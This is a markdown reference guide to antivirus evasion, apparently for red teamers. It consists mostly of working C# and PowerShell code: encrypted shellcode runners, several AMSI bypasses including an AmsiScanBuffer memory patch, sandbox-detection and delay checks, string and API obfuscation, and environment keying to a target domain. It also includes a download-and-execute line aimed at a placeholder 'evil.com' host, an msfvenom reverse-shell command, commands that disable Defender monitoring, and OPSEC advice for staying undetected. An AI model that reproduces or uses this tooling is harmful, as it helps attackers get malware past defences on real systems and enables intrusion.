# Antivirus Evasion Techniques Reference

## ELI5: How Antivirus Works (And How We Bypass It)

**The Cat and Mouse Game:**
Think of antivirus as a security guard at a club. The guard has:
- **A list of banned people** (signatures) - "Don't let John Smith in"
- **Suspicious behavior rules** (heuristics) - "Anyone acting drunk gets kicked out"
- **A holding room** (sandbox) - "New faces wait here for 5 minutes"
- **Phone to HQ** (cloud lookup) - "Is this person on the global ban list?"

We bypass the guard by:
- **Disguising ourselves** (encoding/encryption)
- **Acting normal** (behavioral evasion)
- **Waiting patiently** (sandbox evasion)
- **Using fake IDs** (signature evasion)

## The Evolution of Antivirus

### Generation 1: Simple Signatures (1990s)
Like "WANTED" posters - AV looked for exact matches of known bad code.
- **Bypass**: Change one byte, become invisible

### Generation 2: Heuristic Analysis (2000s)
Like profiling - AV looks for suspicious patterns.
- **Bypass**: Act like legitimate software

### Generation 3: Behavioral Monitoring (2010s)
Like surveillance cameras - AV watches what programs do.
- **Bypass**: Move slowly, blend in

### Generation 4: Machine Learning (2020s)
Like AI security - learns from millions of samples.
- **Bypass**: Train on the same models, find blind spots

## Why AV Evasion Is Critical

### The Reality Check
- **95% of malware** is caught by modern AV
- **But that 5%** is what APTs and ransomware use
- **One detection** = entire operation blown
- **Persistence is key** = must evade continuously

### The Stakes
- **Red Team**: Detection = failed engagement
- **Pentest**: Detection = incomplete assessment
- **Real Attacker**: Detection = law enforcement
- **Defender**: Missed detection = breach

## Detection Methods Overview

### Types of Detection
1. **Static/Signature-Based**: Pattern matching against known malware
2. **Heuristic Analysis**: Behavioral patterns and code structure
3. **Dynamic/Sandbox Analysis**: Execution monitoring in isolated environment
4. **Machine Learning**: AI-based detection models
5. **Cloud Analysis**: Reputation and telemetry-based detection

## Custom Shellcode Runners

### Why Custom Runners?
**The Problem**: Metasploit's encoders are like using the same fake ID that everyone knows is fake. AV vendors have samples of all public tools.

**The Solution**: Write your own loader. It's like making a custom key that only opens your lock - AV has never seen it before.

### Understanding Shellcode Execution
**What's Shellcode?** Machine code instructions (like 0xFC 0x48) that directly tell the CPU what to do. It's the rawest form of program.

**The Loading Process:**
1. **Allocate memory** - Reserve space in RAM
2. **Copy shellcode** - Put our code there
3. **Mark executable** - Tell Windows it's OK to run
4. **Execute** - Jump to our code

### Basic C# Shellcode Runner with Evasion
```csharp
using System;
using System.Runtime.InteropServices;
using System.Threading;

namespace StealthRunner
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
            IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize,
            uint flNewProtect, out uint lpflOldProtect);

        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_READWRITE = 0x04;
        const uint PAGE_EXECUTE_READ = 0x20;

        static void Main(string[] args)
        {
            // Sandbox evasion - sleep
            DateTime start = DateTime.Now;
            Thread.Sleep(10000); // 10 seconds
            double delta = (DateTime.Now - start).TotalSeconds;
            if (delta < 9.5) // Sandbox detected (accelerated sleep)
            {
                return;
            }

            // Encrypted shellcode (XOR with key 0xfa)
            byte[] encrypted = new byte[] {
                0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa,
                // ... encrypted shellcode bytes
            };

            // Decrypt in memory
            byte[] shellcode = new byte[encrypted.Length];
            for (int i = 0; i < encrypted.Length; i++)
            {
                shellcode[i] = (byte)(encrypted[i] ^ 0xfa);
            }

            // Allocate RW memory (not RWX to avoid detection)
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            // Copy shellcode
            Marshal.Copy(shellcode, 0, addr, shellcode.Length);

            // Change to RX (not RWX)
            uint oldProtect;
            VirtualProtect(addr, (uint)shellcode.Length, PAGE_EXECUTE_READ, out oldProtect);

            // Create thread
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

### PowerShell Shellcode Runner with AMSI Bypass
```powershell
# AMSI Bypass - Patching amsiInitFailed
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField(
    'amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Alternative AMSI Bypass - Memory patching
$a = [Ref].Assembly.GetTypes()
$b = $a | ?{$_.Name -like '*iUtils'}
$c = $b.GetFields('NonPublic,Static')
$d = $c | ?{$_.Name -like '*Failed'}
$d.SetValue($null,$true)

# Shellcode execution
function Execute-Shellcode {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true)]
        [Byte[]]$Shellcode
    )

    # Allocate memory
    $addr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($Shellcode.Length)

    # Copy shellcode
    [System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $addr, $Shellcode.Length)

    # Create delegate
    $delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        $addr,
        (Get-DelegateType @([IntPtr]) ([Void]))
    )

    # Execute
    $delegate.Invoke([IntPtr]::Zero)
}

# Encrypted payload (Base64 + XOR)
$encrypted = "SGVsbG8gV29ybGQh..."
$key = 0x55

# Decrypt
$bytes = [Convert]::FromBase64String($encrypted)
$shellcode = $bytes | ForEach-Object { $_ -bxor $key }

# Execute
Execute-Shellcode -Shellcode $shellcode
```

## Encoding and Obfuscation Techniques

### ELI5: Why Encoding Works
Imagine you're smuggling a weapon past security. Instead of bringing a gun, you bring:
- A metal tube (barrel)
- Some springs (trigger mechanism)
- Plastic pieces (grip)

Security sees random parts, not a weapon. You assemble it after passing security. That's encoding - breaking bad code into innocent-looking pieces.

### The Encoding Process
1. **Original**: "ATTACK" (detected)
2. **Encode**: "CVVCEM" (shift by 2)
3. **Pass security**: Looks like gibberish
4. **Decode**: "ATTACK" (execute)

### Caesar Cipher Shellcode Encoding
```csharp
public static byte[] CaesarEncode(byte[] shellcode, byte shift)
{
    byte[] encoded = new byte[shellcode.Length];
    for (int i = 0; i < shellcode.Length; i++)
    {
        encoded[i] = (byte)((shellcode[i] + shift) % 256);
    }
    return encoded;
}

public static byte[] CaesarDecode(byte[] encoded, byte shift)
{
    byte[] decoded = new byte[encoded.Length];
    for (int i = 0; i < encoded.Length; i++)
    {
        decoded[i] = (byte)((encoded[i] - shift + 256) % 256);
    }
    return decoded;
}
```

### AES Encryption for Payloads
```csharp
using System.Security.Cryptography;
using System.IO;

public static byte[] AESEncrypt(byte[] shellcode, byte[] key, byte[] iv)
{
    using (Aes aes = Aes.Create())
    {
        aes.Key = key;
        aes.IV = iv;
        aes.Mode = CipherMode.CBC;
        aes.Padding = PaddingMode.PKCS7;

        using (var encryptor = aes.CreateEncryptor())
        using (var msEncrypt = new MemoryStream())
        using (var csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
        {
            csEncrypt.Write(shellcode, 0, shellcode.Length);
            csEncrypt.FlushFinalBlock();
            return msEncrypt.ToArray();
        }
    }
}

public static byte[] AESDecrypt(byte[] encrypted, byte[] key, byte[] iv)
{
    using (Aes aes = Aes.Create())
    {
        aes.Key = key;
        aes.IV = iv;
        aes.Mode = CipherMode.CBC;
        aes.Padding = PaddingMode.PKCS7;

        using (var decryptor = aes.CreateDecryptor())
        using (var msDecrypt = new MemoryStream(encrypted))
        using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
        using (var resultStream = new MemoryStream())
        {
            csDecrypt.CopyTo(resultStream);
            return resultStream.ToArray();
        }
    }
}
```

### String Obfuscation
```csharp
// Avoid static strings that can be signatures
public class StringObfuscator
{
    // Split and concatenate
    public static string GetKernel32()
    {
        return "ker" + "nel" + "32" + ".dll";
    }

    // Base64 decode
    public static string GetVirtualAlloc()
    {
        return Encoding.UTF8.GetString(
            Convert.FromBase64String("VmlydHVhbEFsbG9j")
        );
    }

    // Character array
    public static string GetCreateThread()
    {
        char[] chars = { 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd' };
        return new string(chars);
    }

    // ROT13
    public static string ROT13(string input)
    {
        return new string(input.Select(c =>
        {
            if (!char.IsLetter(c)) return c;
            char offset = char.IsUpper(c) ? 'A' : 'a';
            return (char)((c + 13 - offset) % 26 + offset);
        }).ToArray());
    }
}
```

## Sandbox Detection and Evasion

### Understanding Sandboxes
**What's a Sandbox?** A virtual prison where AV runs suspicious files to see what they do. Like a police interrogation room with one-way glass.

**How Sandboxes Work:**
1. File arrives
2. Sandbox runs it for 30-60 seconds
3. Monitors all behavior
4. If bad behavior detected = blocked
5. If nothing happens = allowed through

**The Weakness:** Sandboxes are impatient! They can't wait forever. If we wait 2 minutes before doing anything bad, we win.

### Sandbox Indicators (Red Flags)
Sandboxes are fake environments with tells:
- **No real user**: Mouse doesn't move
- **Limited resources**: 1 CPU core, 2GB RAM
- **Fresh Windows**: Installed 5 minutes ago
- **Fake names**: "admin", "user", "sandbox"
- **VM artifacts**: VMware tools, VirtualBox drivers

### Comprehensive Sandbox Detection
```csharp
public static class SandboxDetection
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    static extern bool IsDebuggerPresent();

    public static bool IsSandboxed()
    {
        int score = 0;

        // Check for debugger
        if (IsDebuggerPresent())
            score += 3;

        // Check sleep acceleration
        DateTime start = DateTime.Now;
        Thread.Sleep(5000);
        if ((DateTime.Now - start).TotalSeconds < 4.5)
            score += 3;

        // Check for sandbox DLLs
        string[] sandboxDlls = {
            "sbiedll.dll",     // Sandboxie
            "dbghelp.dll",     // Debugging
            "api_log.dll",     // Sandbox monitoring
            "dir_watch.dll",   // Directory watcher
            "pstorec.dll",     // Protected storage
            "vmcheck.dll",     // Virtual machine
            "wpespy.dll"       // WPE Pro
        };

        foreach (string dll in sandboxDlls)
        {
            if (GetModuleHandle(dll) != IntPtr.Zero)
                score += 2;
        }

        // Check username
        string[] sandboxUsers = { "admin", "test", "user", "sandbox", "virus", "malware" };
        string currentUser = Environment.UserName.ToLower();
        if (sandboxUsers.Any(u => currentUser.Contains(u)))
            score += 1;

        // Check computer name
        string[] sandboxNames = { "sandbox", "vm", "virtual", "qemu", "vbox", "vmware" };
        string computerName = Environment.MachineName.ToLower();
        if (sandboxNames.Any(n => computerName.Contains(n)))
            score += 1;

        // Check CPU cores
        if (Environment.ProcessorCount < 2)
            score += 1;

        // Check RAM
        if (new Microsoft.VisualBasic.Devices.ComputerInfo().TotalPhysicalMemory < 2147483648) // 2GB
            score += 1;

        // Check for mouse movement
        var pos1 = System.Windows.Forms.Cursor.Position;
        Thread.Sleep(100);
        var pos2 = System.Windows.Forms.Cursor.Position;
        if (pos1 == pos2)
            score += 1;

        return score >= 3; // Threshold for detection
    }

    public static void EvadeSandbox()
    {
        // Time-based evasion
        Thread.Sleep(60000); // 1 minute

        // User interaction requirement
        Console.WriteLine("Press any key to continue...");
        Console.ReadKey();

        // Network connectivity check
        try
        {
            var client = new System.Net.WebClient();
            client.DownloadString("https://www.google.com");
        }
        catch
        {
            Environment.Exit(0); // Exit if no internet
        }
    }
}
```

## AMSI Bypass Techniques

### ELI5: What Is AMSI?
**AMSI (Antimalware Scan Interface)** is like a security checkpoint inside Windows. When PowerShell or other scripts run, AMSI scans them first. It's the reason why `Invoke-Mimikatz` gets blocked instantly.

**The Airport Security Analogy:**
- Normal AV = Airport entrance security
- AMSI = Security at each gate
- Even if you sneak past the entrance, gate security catches you

**How We Bypass:** We either break the scanner or convince it we're harmless. Like disabling the metal detector or having a fake "TSA PreCheck".

### The AMSI Chain
1. Script runs in PowerShell
2. PowerShell sends script to AMSI
3. AMSI asks Windows Defender to scan
4. Defender says "bad" or "good"
5. PowerShell blocks or allows execution

**Breaking the Chain:** We attack step 2 or 3 - stop PowerShell from asking, or break AMSI's ability to scan.

### PowerShell AMSI Bypasses
```powershell
# Method 1: Reflection
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Method 2: Obfuscated reflection
$a='si';$b='Am';$c='Utils'
$d=[Ref].Assembly.GetType('System.Management.Automation.'+$b+$a+$c)
$e='amsi';$f='Init';$g='Failed'
$d.GetField($e+$f+$g,'NonPublic,Static').SetValue($null,$true)

# Method 3: Force error
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiSession','NonPublic,Static').SetValue($null,$null)

# Method 4: Memory patching
$a = [Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null,$a)
```

### C# AMSI Bypass
```csharp
using System;
using System.Runtime.InteropServices;

public class AmsiBypass
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
        uint flNewProtect, out uint lpflOldProtect);

    public static void Bypass()
    {
        // Patch AmsiScanBuffer
        IntPtr amsiDll = LoadLibrary("amsi.dll");
        IntPtr amsiScanBuffer = GetProcAddress(amsiDll, "AmsiScanBuffer");

        uint oldProtect;
        VirtualProtect(amsiScanBuffer, (UIntPtr)5, 0x40, out oldProtect);

        // Patch bytes: mov eax, 0x80070057; ret
        byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        Marshal.Copy(patch, 0, amsiScanBuffer, patch.Length);

        VirtualProtect(amsiScanBuffer, (UIntPtr)5, oldProtect, out oldProtect);
    }
}
```

## Advanced Evasion Techniques

### API Hashing and Dynamic Resolution
```csharp
public class APIHashing
{
    // Simple DJB2 hash
    public static uint Hash(string str)
    {
        uint hash = 5381;
        foreach (char c in str)
        {
            hash = ((hash << 5) + hash) + c;
        }
        return hash;
    }

    // Resolve function by hash
    public static IntPtr GetProcAddressByHash(IntPtr hModule, uint hash)
    {
        // Parse PE export table
        // Compare each export name hash
        // Return matching function address
        return IntPtr.Zero;
    }

    // Usage
    public static void Example()
    {
        uint virtualAllocHash = Hash("VirtualAlloc"); // Pre-computed: 0x91AFCA54
        IntPtr kernel32 = LoadLibrary("kernel32.dll");
        IntPtr virtualAlloc = GetProcAddressByHash(kernel32, 0x91AFCA54);
    }
}
```

### Delayed Execution
```csharp
public class DelayedExecution
{
    public static void ExecuteWithDelay()
    {
        // Random delay
        Random rand = new Random();
        int delay = rand.Next(30000, 120000); // 30 seconds to 2 minutes
        Thread.Sleep(delay);

        // Check system uptime
        int tickCount = Environment.TickCount;
        if (tickCount < 600000) // Less than 10 minutes
        {
            return; // Likely a sandbox
        }

        // Execute payload
        ExecuteShellcode();
    }

    public static void ScheduledExecution()
    {
        // Create scheduled task for persistence and delayed execution
        string xml = @"
        <Task>
            <Triggers>
                <TimeTrigger>
                    <StartBoundary>2024-01-01T12:00:00</StartBoundary>
                </TimeTrigger>
            </Triggers>
            <Actions>
                <Exec>
                    <Command>C:\Windows\Temp\payload.exe</Command>
                </Exec>
            </Actions>
        </Task>";

        System.Diagnostics.Process.Start("schtasks",
            "/create /tn \"Updates\" /xml -");
    }
}
```

## Signature Evasion

### Code Metamorphism
```csharp
// Original suspicious code
byte[] shellcode = new byte[] { 0xfc, 0x48, 0x83 };

// Metamorphic version 1
byte[] part1 = new byte[] { 0xfc };
byte[] part2 = new byte[] { 0x48 };
byte[] part3 = new byte[] { 0x83 };
byte[] shellcode = part1.Concat(part2).Concat(part3).ToArray();

// Metamorphic version 2
List<byte> code = new List<byte>();
code.Add(0xfc);
code.Add(0x48);
code.Add(0x83);
byte[] shellcode = code.ToArray();

// Metamorphic version 3
byte[] shellcode = Convert.FromBase64String("L0iD");
```

### Function Call Obfuscation
```csharp
// Direct call (easily detected)
VirtualAlloc(IntPtr.Zero, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

// Indirect call via delegate
delegate IntPtr VA(IntPtr a, uint b, uint c, uint d);
VA virtualAlloc = (VA)Marshal.GetDelegateForFunctionPointer(
    GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAlloc"),
    typeof(VA)
);
virtualAlloc(IntPtr.Zero, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

// Reflection-based call
Type kernel32 = Type.GetType("Kernel32");
MethodInfo method = kernel32.GetMethod("VirtualAlloc");
method.Invoke(null, new object[] { IntPtr.Zero, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE });
```

## Testing Against AV

### Local Testing Commands
```powershell
# Test with Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $false
Update-MpSignature

# Scan specific file
Start-MpScan -ScanType CustomScan -ScanPath "C:\path\to\payload.exe"

# Check detection
Get-MpThreatDetection

# Test AMSI
'Invoke-Expression (New-Object Net.WebClient).DownloadString("http://evil.com/script.ps1")' | Out-String | IEX
```

### Online Scanners (Use Carefully)
- antiscan.me (doesn't distribute samples)
- nodistribute.com (doesn't distribute)
- virustotal.com (DISTRIBUTES to AV vendors)

## OPSEC Considerations

### Best Practices
1. Never test on VirusTotal before operation
2. Use custom encryption for each target
3. Implement environment keying
4. Avoid common IoCs (strings, hashes)
5. Use legitimate process for injection
6. Clean up artifacts

### Environmental Keying
```csharp
// Only decrypt/run on specific target
public static bool IsTargetEnvironment()
{
    // Domain check
    if (!Environment.UserDomainName.Equals("TARGETCORP"))
        return false;

    // Username check
    if (!Environment.UserName.StartsWith("user"))
        return false;

    // Machine name check
    if (!Environment.MachineName.Contains("WS"))
        return false;

    return true;
}
```

## Common Pitfalls

1. **Using default Metasploit payloads** - Always encode/encrypt
2. **Hardcoded strings** - Use obfuscation
3. **RWX memory** - Use RW then RX
4. **Direct API calls** - Use indirection
5. **No sandbox checks** - Implement multiple checks
6. **Testing on VirusTotal** - Use private scanners

## Lab Setup

### Testing Environment
```powershell
# Disable Windows Defender for testing
Set-MpPreference -DisableRealtimeMonitoring $true

# Enable AMSI logging
Set-PSReadLineOption -HistorySaveStyle SaveNothing

# Monitor AMSI events
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-AMSI/Operational'}
```

### Building Payloads
```bash
# Generate shellcode
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f csharp

# Encrypt with custom tool
python3 encrypt.py shellcode.bin --xor-key 0xAB --output encrypted.bin

# Compile with optimization
csc.exe /target:exe /optimize /out:payload.exe Program.cs
```